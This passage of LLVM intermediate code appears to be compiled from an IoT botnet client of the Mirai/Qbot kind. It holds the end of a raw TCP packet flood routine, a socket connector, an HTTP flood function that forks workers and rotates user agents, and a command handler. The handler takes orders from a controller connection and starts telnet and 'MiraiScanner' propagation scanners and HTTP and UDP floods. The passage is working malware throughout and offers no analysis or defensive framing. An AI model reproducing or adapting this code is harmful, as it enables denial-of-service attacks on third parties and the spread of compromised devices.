  store i16 %288, i16* %290, align 4
  %291 = call i32 @rand_cmwc()
  %292 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 0
  %294 = bitcast %union.anon* %293 to %struct.anon.0*
  %295 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %294, i32 0, i32 2
  store i32 %291, i32* %295, align 4
  %296 = call i32 @rand_cmwc()
  %297 = trunc i32 %296 to i16
  %298 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 0
  store i16 %297, i16* %301, align 4
  %302 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %303 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %302, i32 0, i32 0
  %304 = bitcast %union.anon* %303 to %struct.anon.0*
  %305 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %304, i32 0, i32 6
  store i16 0, i16* %305, align 4
  %306 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %307 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %308 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %306, %struct.tcphdr* noundef %307)
  %309 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon* %310 to %struct.anon.0*
  %312 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %311, i32 0, i32 6
  store i16 %308, i16* %312, align 4
  %313 = bitcast i8* %74 to i16*
  %314 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 2
  %316 = load i16, i16* %315, align 2
  %317 = zext i16 %316 to i32
  %318 = call zeroext i16 @csum(i16* noundef %313, i32 noundef %317)
  %319 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %320 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %319, i32 0, i32 7
  store i16 %318, i16* %320, align 2
  %321 = load i32, i32* %26, align 4
  %322 = load i32, i32* %15, align 4
  %323 = icmp eq i32 %321, %322
  br i1 %323, label %324, label %331

324:                                              ; preds = %278
  %325 = call i64 @time(i64* noundef null) #10
  %326 = load i32, i32* %25, align 4
  %327 = sext i32 %326 to i64
  %328 = icmp sgt i64 %325, %327
  br i1 %328, label %329, label %330

329:                                              ; preds = %324
  br label %334

330:                                              ; preds = %324
  store i32 0, i32* %26, align 4
  br label %277

331:                                              ; preds = %278
  %332 = load i32, i32* %26, align 4
  %333 = add i32 %332, 1
  store i32 %333, i32* %26, align 4
  br label %277

334:                                              ; preds = %329
  %335 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %335)
  br label %336

336:                                              ; preds = %334, %58, %52, %45
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8* noundef, i8* noundef) #4

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @socket_connect(i8* noundef %0, i16 noundef zeroext %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* noundef %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

14:                                               ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* noundef %19, i8* noundef %21, i64 noundef %25) #10
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 noundef zeroext %26) #12
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 6) #10
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 noundef %31, i32 noundef 6, i32 noundef 1, i8* noundef %32, i32 noundef 4) #10
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

36:                                               ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

37:                                               ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 noundef %38, %struct.sockaddr* noundef %39, i32 noundef 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

42:                                               ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

43:                                               ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

45:                                               ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @SendHTTP(i8* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i8* noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* noundef null) #10
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %24

24:                                               ; preds = %67, %6
  %25 = load i32, i32* %14, align 4
  %26 = load i32, i32* %12, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %70

28:                                               ; preds = %24
  %29 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %30 = load i8*, i8** %7, align 8
  %31 = load i8*, i8** %10, align 8
  %32 = load i8*, i8** %8, align 8
  %33 = call i32 @rand() #10
  %34 = srem i32 %33, 59
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %35
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %29, i8* noundef getelementptr inbounds ([64 x i8], [64 x i8]* @.str.509, i64 0, i64 0), i8* noundef %30, i8* noundef %31, i8* noundef %32, i8* noundef %37) #10
  %39 = call i32 @fork() #10
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %66

41:                                               ; preds = %28
  br label %42

42:                                               ; preds = %64, %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = call i64 @time(i64* noundef null) #10
  %46 = icmp sgt i64 %44, %45
  br i1 %46, label %47, label %65

47:                                               ; preds = %42
  %48 = load i8*, i8** %8, align 8
  %49 = load i16, i16* %9, align 2
  %50 = call i32 @socket_connect(i8* noundef %48, i16 noundef zeroext %49)
  store i32 %50, i32* %13, align 4
  %51 = load i32, i32* %13, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %64

53:                                               ; preds = %47
  %54 = load i32, i32* %13, align 4
  %55 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i64 0, i64 0
  %57 = call i64 @strlen(i8* noundef %56) #11
  %58 = call i64 @write(i32 noundef %54, i8* noundef %55, i64 noundef %57)
  %59 = load i32, i32* %13, align 4
  %60 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i64 0, i64 0
  %61 = call i64 @read(i32 noundef %59, i8* noundef %60, i64 noundef 1)
  %62 = load i32, i32* %13, align 4
  %63 = call i32 @close(i32 noundef %62)
  br label %64

64:                                               ; preds = %53, %47
  br label %42, !llvm.loop !43

65:                                               ; preds = %42
  call void @exit(i32 noundef 0) #14
  unreachable

66:                                               ; preds = %28
  br label %67

67:                                               ; preds = %66
  %68 = load i32, i32* %14, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %14, align 4
  br label %24, !llvm.loop !44

70:                                               ; preds = %24
  ret void
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #9

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @processCmd(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* noundef %40, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #11
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

43:                                               ; preds = %2
  br label %617

44:                                               ; preds = %2
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* noundef %47, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.511, i64 0, i64 0)) #11
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %138, label %50

50:                                               ; preds = %44
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* noundef %53, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i64 0, i64 0)) #11
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %101, label %56

56:                                               ; preds = %50
  %57 = call i32 @fork() #10
  store i32 %57, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %58 = call i64 @sysconf(i32 noundef 84) #10
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp eq i32 %60, 1
  br i1 %61, label %62, label %63

62:                                               ; preds = %56
  store i32 500, i32* %8, align 4
  br label %63

63:                                               ; preds = %62, %56
  %64 = load i32, i32* %7, align 4
  %65 = icmp sge i32 %64, 2
  br i1 %65, label %66, label %67

66:                                               ; preds = %63
  store i32 1000, i32* %8, align 4
  br label %67

67:                                               ; preds = %66, %63
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

70:                                               ; preds = %67
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %617

72:                                               ; preds = %67
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

75:                                               ; preds = %72
  br label %617

76:                                               ; preds = %72
  br label %77

77:                                               ; preds = %76
  store i32 0, i32* %6, align 4
  br label %78

78:                                               ; preds = %97, %77
  %79 = load i32, i32* %6, align 4
  %80 = load i32, i32* %7, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %100

82:                                               ; preds = %78
  %83 = call i64 @time(i64* noundef null) #10
  %84 = call i32 @getpid() #10
  %85 = sext i32 %84 to i64
  %86 = xor i64 %83, %85
  %87 = call i32 @getppid() #10
  %88 = sext i32 %87 to i64
  %89 = add nsw i64 %86, %88
  %90 = trunc i64 %89 to i32
  call void @srand(i32 noundef %90) #10
  %91 = call i64 @time(i64* noundef null) #10
  %92 = call i32 @getpid() #10
  %93 = sext i32 %92 to i64
  %94 = xor i64 %91, %93
  %95 = trunc i64 %94 to i32
  call void @init_rand(i32 noundef %95)
  %96 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 noundef 100, i32 noundef %96)
  call void @_exit(i32 noundef 0) #13
  unreachable

97:                                               ; No predecessors!
  %98 = load i32, i32* %6, align 4
  %99 = add nsw i32 %98, 1
  store i32 %99, i32* %6, align 4
  br label %78, !llvm.loop !45

100:                                              ; preds = %78
  br label %101

101:                                              ; preds = %100, %50
  %102 = load i8**, i8*** %4, align 8
  %103 = getelementptr inbounds i8*, i8** %102, i64 1
  %104 = load i8*, i8** %103, align 8
  %105 = call i32 @strcmp(i8* noundef %104, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i64 0, i64 0)) #11
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %114, label %107

107:                                              ; preds = %101
  %108 = load i32, i32* @scanPid, align 4
  %109 = icmp eq i32 %108, 0
  br i1 %109, label %110, label %111

110:                                              ; preds = %107
  br label %617

111:                                              ; preds = %107
  %112 = load i32, i32* @scanPid, align 4
  %113 = call i32 @kill(i32 noundef %112, i32 noundef 9) #10
  store i32 0, i32* @scanPid, align 4
  br label %114

114:                                              ; preds = %111, %101
  %115 = load i8**, i8*** %4, align 8
  %116 = getelementptr inbounds i8*, i8** %115, i64 1
  %117 = load i8*, i8** %116, align 8
  %118 = call i32 @strcmp(i8* noundef %117, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i64 0, i64 0)) #11
  %119 = icmp ne i32 %118, 0
  br i1 %119, label %137, label %120

120:                                              ; preds = %114
  %121 = load i8**, i8*** %4, align 8
  %122 = getelementptr inbounds i8*, i8** %121, i64 1
  %123 = load i8*, i8** %122, align 8
  %124 = call i32 @atoi(i8* noundef %123) #11
  store i32 %124, i32* %9, align 4
  %125 = load i8**, i8*** %4, align 8
  %126 = getelementptr inbounds i8*, i8** %125, i64 2
  %127 = load i8*, i8** %126, align 8
  %128 = call i32 @atoi(i8* noundef %127) #11
  store i32 %128, i32* %10, align 4
  %129 = call i32 @listFork()
  %130 = icmp ne i32 %129, 0
  br i1 %130, label %136, label %131

131:                                              ; preds = %120
  %132 = load i32, i32* @mainCommSock, align 4
  %133 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %132, i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i64 0, i64 0))
  %134 = load i32, i32* %10, align 4
  %135 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 noundef %134, i32 noundef %135)
  call void @_exit(i32 noundef 0) #13
  unreachable

136:                                              ; preds = %120
  br label %617

137:                                              ; preds = %114
  br label %138

138:                                              ; preds = %137, %44
  %139 = load i8**, i8*** %4, align 8
  %140 = getelementptr inbounds i8*, i8** %139, i64 0
  %141 = load i8*, i8** %140, align 8
  %142 = call i32 @strcmp(i8* noundef %141, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.516, i64 0, i64 0)) #11
  %143 = icmp ne i32 %142, 0
  br i1 %143, label %232, label %144

144:                                              ; preds = %138
  %145 = load i8**, i8*** %4, align 8
  %146 = getelementptr inbounds i8*, i8** %145, i64 1
  %147 = load i8*, i8** %146, align 8
  %148 = call i32 @strcmp(i8* noundef %147, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i64 0, i64 0)) #11
  %149 = icmp ne i32 %148, 0
  br i1 %149, label %195, label %150

150:                                              ; preds = %144
  %151 = call i32 @fork() #10
  store i32 %151, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %152 = call i64 @sysconf(i32 noundef 84) #10
  %153 = trunc i64 %152 to i32
  store i32 %153, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %154 = load i32, i32* %13, align 4
  %155 = icmp eq i32 %154, 1
  br i1 %155, label %156, label %157

156:                                              ; preds = %150
  store i32 500, i32* %14, align 4
  br label %157

157:                                              ; preds = %156, %150
  %158 = load i32, i32* %13, align 4
  %159 = icmp sge i32 %158, 2
  br i1 %159, label %160, label %161

160:                                              ; preds = %157
  store i32 1000, i32* %14, align 4
  br label %161

161:                                              ; preds = %160, %157
  %162 = load i32, i32* %11, align 4
  %163 = icmp ugt i32 %162, 0
  br i1 %163, label %164, label %166

164:                                              ; preds = %161
  %165 = load i32, i32* %11, align 4
  store i32 %165, i32* @scanPid, align 4
  br label %617

166:                                              ; preds = %161
  %167 = load i32, i32* %11, align 4
  %168 = icmp eq i32 %167, -1
  br i1 %168, label %169, label %170

169:                                              ; preds = %166
  br label %617

170:                                              ; preds = %166
  br label %171

171:                                              ; preds = %170
  store i32 0, i32* %12, align 4
  br label %172

172:                                              ; preds = %191, %171
  %173 = load i32, i32* %12, align 4
  %174 = load i32, i32* %13, align 4
  %175 = icmp slt i32 %173, %174
  br i1 %175, label %176, label %194

176:                                              ; preds = %172
  %177 = call i64 @time(i64* noundef null) #10
  %178 = call i32 @getpid() #10
  %179 = sext i32 %178 to i64
  %180 = xor i64 %177, %179
  %181 = call i32 @getppid() #10
  %182 = sext i32 %181 to i64
  %183 = add nsw i64 %180, %182
  %184 = trunc i64 %183 to i32
  call void @srand(i32 noundef %184) #10
  %185 = call i64 @time(i64* noundef null) #10
  %186 = call i32 @getpid() #10
  %187 = sext i32 %186 to i64
  %188 = xor i64 %185, %187
  %189 = trunc i64 %188 to i32
  call void @init_rand(i32 noundef %189)
  %190 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 noundef 100, i32 noundef %190)
  call void @_exit(i32 noundef 0) #13
  unreachable

191:                                              ; No predecessors!
  %192 = load i32, i32* %12, align 4
  %193 = add nsw i32 %192, 1
  store i32 %193, i32* %12, align 4
  br label %172, !llvm.loop !46

194:                                              ; preds = %172
  br label %195

195:                                              ; preds = %194, %144
  %196 = load i8**, i8*** %4, align 8
  %197 = getelementptr inbounds i8*, i8** %196, i64 1
  %198 = load i8*, i8** %197, align 8
  %199 = call i32 @strcmp(i8* noundef %198, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i64 0, i64 0)) #11
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %208, label %201

201:                                              ; preds = %195
  %202 = load i32, i32* @scanPid, align 4
  %203 = icmp eq i32 %202, 0
  br i1 %203, label %204, label %205

204:                                              ; preds = %201
  br label %617

205:                                              ; preds = %201
  %206 = load i32, i32* @scanPid, align 4
  %207 = call i32 @kill(i32 noundef %206, i32 noundef 9) #10
  store i32 0, i32* @scanPid, align 4
  br label %208

208:                                              ; preds = %205, %195
  %209 = load i8**, i8*** %4, align 8
  %210 = getelementptr inbounds i8*, i8** %209, i64 1
  %211 = load i8*, i8** %210, align 8
  %212 = call i32 @strcmp(i8* noundef %211, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i64 0, i64 0)) #11
  %213 = icmp ne i32 %212, 0
  br i1 %213, label %231, label %214

214:                                              ; preds = %208
  %215 = load i8**, i8*** %4, align 8
  %216 = getelementptr inbounds i8*, i8** %215, i64 1
  %217 = load i8*, i8** %216, align 8
  %218 = call i32 @atoi(i8* noundef %217) #11
  store i32 %218, i32* %15, align 4
  %219 = load i8**, i8*** %4, align 8
  %220 = getelementptr inbounds i8*, i8** %219, i64 2
  %221 = load i8*, i8** %220, align 8
  %222 = call i32 @atoi(i8* noundef %221) #11
  store i32 %222, i32* %16, align 4
  %223 = call i32 @listFork()
  %224 = icmp ne i32 %223, 0
  br i1 %224, label %230, label %225

225:                                              ; preds = %214
  %226 = load i32, i32* @mainCommSock, align 4
  %227 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %226, i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i64 0, i64 0))
  %228 = load i32, i32* %16, align 4
  %229 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 noundef %228, i32 noundef %229)
  call void @_exit(i32 noundef 0) #13
  unreachable

230:                                              ; preds = %214
  br label %617

231:                                              ; preds = %208
  br label %232

232:                                              ; preds = %231, %138
  %233 = load i8**, i8*** %4, align 8
  %234 = getelementptr inbounds i8*, i8** %233, i64 0
  %235 = load i8*, i8** %234, align 8
  %236 = call i32 @strcmp(i8* noundef %235, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.518, i64 0, i64 0)) #11
  %237 = icmp ne i32 %236, 0
  br i1 %237, label %281, label %238

238:                                              ; preds = %232
  %239 = load i32, i32* %3, align 4
  %240 = icmp slt i32 %239, 6
  br i1 %240, label %253, label %241

241:                                              ; preds = %238
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 3
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* noundef %244) #11
  %246 = icmp slt i32 %245, 1
  br i1 %246, label %253, label %247

247:                                              ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 5
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* noundef %250) #11
  %252 = icmp slt i32 %251, 1
  br i1 %252, label %253, label %254

253:                                              ; preds = %247, %241, %238
  br label %617

254:                                              ; preds = %247
  %255 = call i32 @listFork()
  %256 = icmp ne i32 %255, 0
  br i1 %256, label %257, label %258

257:                                              ; preds = %254
  br label %617

258:                                              ; preds = %254
  %259 = load i8**, i8*** %4, align 8
  %260 = getelementptr inbounds i8*, i8** %259, i64 1
  %261 = load i8*, i8** %260, align 8
  %262 = load i8**, i8*** %4, align 8
  %263 = getelementptr inbounds i8*, i8** %262, i64 2
  %264 = load i8*, i8** %263, align 8
  %265 = load i8**, i8*** %4, align 8
  %266 = getelementptr inbounds i8*, i8** %265, i64 3
  %267 = load i8*, i8** %266, align 8
  %268 = call i32 @atoi(i8* noundef %267) #11
  %269 = trunc i32 %268 to i16
  %270 = load i8**, i8*** %4, align 8
  %271 = getelementptr inbounds i8*, i8** %270, i64 4
  %272 = load i8*, i8** %271, align 8
  %273 = load i8**, i8*** %4, align 8
  %274 = getelementptr inbounds i8*, i8** %273, i64 5
  %275 = load i8*, i8** %274, align 8
  %276 = call i32 @atoi(i8* noundef %275) #11
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 6
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* noundef %279) #11
  call void @SendHTTP(i8* noundef %261, i8* noundef %264, i16 noundef zeroext %269, i8* noundef %272, i32 noundef %276, i32 noundef %280)
  call void @exit(i32 noundef 0) #14
  unreachable

281:                                              ; preds = %232
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 0
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 @strcmp(i8* noundef %284, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.519, i64 0, i64 0)) #11
  %286 = icmp ne i32 %285, 0
  br i1 %286, label %384, label %287

287:                                              ; preds = %281
  %288 = load i32, i32* %3, align 4
  %289 = icmp slt i32 %288, 6
  br i1 %289, label %323, label %290

290:                                              ; preds = %287
  %291 = load i8**, i8*** %4, align 8
  %292 = getelementptr inbounds i8*, i8** %291, i64 3
  %293 = load i8*, i8** %292, align 8
  %294 = call i32 @atoi(i8* noundef %293) #11
  %295 = icmp eq i32 %294, -1
  br i1 %295, label %323, label %296

296:                                              ; preds = %290
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 2
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* noundef %299) #11
  %301 = icmp eq i32 %300, -1
  br i1 %301, label %323, label %302

302:                                              ; preds = %296
  %303 = load i8**, i8*** %4, align 8
  %304 = getelementptr inbounds i8*, i8** %303, i64 4
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 @atoi(i8* noundef %305) #11
  %307 = icmp eq i32 %306, -1
  br i1 %307, label %323, label %308

308:                                              ; preds = %302
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 4
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* noundef %311) #11
  %313 = icmp sgt i32 %312, 1024
  br i1 %313, label %323, label %314

314:                                              ; preds = %308
  %315 = load i32, i32* %3, align 4
  %316 = icmp eq i32 %315, 6
  br i1 %316, label %317, label %324

317:                                              ; preds = %314
  %318 = load i8**, i8*** %4, align 8
  %319 = getelementptr inbounds i8*, i8** %318, i64 5
  %320 = load i8*, i8** %319, align 8
  %321 = call i32 @atoi(i8* noundef %320) #11
  %322 = icmp slt i32 %321, 1
  br i1 %322, label %323, label %324

323:                                              ; preds = %317, %308, %302, %296, %290, %287
  br label %617

324:                                              ; preds = %317, %314
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 1
  %327 = load i8*, i8** %326, align 8
  store i8* %327, i8** %17, align 8
  %328 = load i8**, i8*** %4, align 8
  %329 = getelementptr inbounds i8*, i8** %328, i64 2
  %330 = load i8*, i8** %329, align 8
  %331 = call i32 @atoi(i8* noundef %330) #11
  store i32 %331, i32* %18, align 4
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 3
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* noundef %334) #11
  store i32 %335, i32* %19, align 4
  %336 = load i8**, i8*** %4, align 8
  %337 = getelementptr inbounds i8*, i8** %336, i64 4
  %338 = load i8*, i8** %337, align 8
  %339 = call i32 @atoi(i8* noundef %338) #11
  store i32 %339, i32* %20, align 4
  %340 = load i32, i32* %3, align 4
  %341 = icmp eq i32 %340, 6
  br i1 %341, label %342, label %347

342:                                              ; preds = %324
  %343 = load i8**, i8*** %4, align 8
  %344 = getelementptr inbounds i8*, i8** %343, i64 5
  %345 = load i8*, i8** %344, align 8
  %346 = call i32 @atoi(i8* noundef %345) #11
  br label %348

347:                                              ; preds = %324
  br label %348

348:                                              ; preds = %347, %342
  %349 = phi i32 [ %346, %342 ], [ 10, %347 ]
  store i32 %349, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %350 = load i8*, i8** %17, align 8
  %351 = call i8* @strstr(i8* noundef %350, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #11
  %352 = icmp ne i8* %351, null
  br i1 %352, label %353, label %372

353:                                              ; preds = %348
  %354 = load i8*, i8** %17, align 8
  %355 = call i8* @strtok(i8* noundef %354, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i64 0, i64 0)) #10
  store i8* %355, i8** %23, align 8
  br label %356

356:                                              ; preds = %369, %353
  %357 = load i8*, i8** %23, align 8
  %358 = icmp ne i8* %357, null
  br i1 %358, label %359, label %371

359:                                              ; preds = %356
  %360 = call i32 @listFork()
  %361 = icmp ne i32 %360, 0
  br i1 %361, label %369, label %362

362:                                              ; preds = %359
  %363 = load i8*, i8** %23, align 8
  %364 = load i32, i32* %18, align 4
  %365 = load i32, i32* %19, align 4
  %366 = load i32, i32* %20, align 4
  %367 = load i32, i32* %21, align 4
  %368 = load i32, i32* %22, align 4
  call void @SendUDP(i8* noundef %363, i32 noundef %364, i32 noundef %365, i32 noundef %366, i32 noundef %367, i32 noundef %368)
  call void @_exit(i32 noundef 0) #13
  unreachable

369:                                              ; preds = %359
